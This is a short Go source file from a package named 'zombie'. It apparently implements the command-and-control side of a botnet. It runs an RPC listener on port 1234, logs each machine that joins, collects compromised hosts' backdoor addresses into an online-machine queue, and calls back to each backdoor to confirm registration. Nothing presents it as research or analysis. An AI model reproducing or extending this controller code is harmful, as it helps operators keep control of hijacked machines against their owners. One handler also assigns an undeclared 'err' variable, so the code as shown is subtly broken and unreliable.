package zombie

import (
	"log"
	"net"
	"net/rpc"

	"github.com/astaxie/beego/logs"
)

type statusRpcServer struct {
	rpc.Server
	log *logs.BeeLogger
}

var OnlineMachine = make(chan string, 1000)

type HeaderReceiver struct {
}

func NewServer() {
	rpcServer := new(statusRpcServer)
	rpcServer.log = logs.NewLogger(100000)
	rpcServer.log.SetLevel(log.Llongfile)
	rpcServer.log.SetLogger("console", "")
	listener, e := net.Listen("tcp", ":1234")
	if e != nil {
		log.Fatal("listen error:", e)
	}

	rpcServer.log.Info("start to listen local port at %s", "1234")
	rpcServer.Register(new(HeaderReceiver))
	rpcServer.Accept(listener)
}

func (rpc *statusRpcServer) Accept(lis net.Listener) {
	for {
		conn, err := lis.Accept()
		if err != nil {
			log.Fatal("rpc.Serve: accept:", err.Error())
		}
		rpc.log.Info("%s joined the network", conn.RemoteAddr().String())
		go rpc.ServeConn(conn)
	}
}

func (c *HeaderReceiver) GetBackDoorAddress(args *RpcArgs, reply *int) error {
	backDoorClient := NewClient(args.Argu)
	OnlineMachine <- args.Argu
	backDoorClient.args.Argu = "Header received zombie rpc address"
	err = backDoorClient.rpc.Call("BackDoor.HeaderConfirmed", backDoorClient.args, &reply)
	if err != nil {
		log.Println(err)
	}
	return nil

}
func (c *HeaderReceiver) HeartBeat(args *RpcArgs, reply *int) error {
	return nil
}
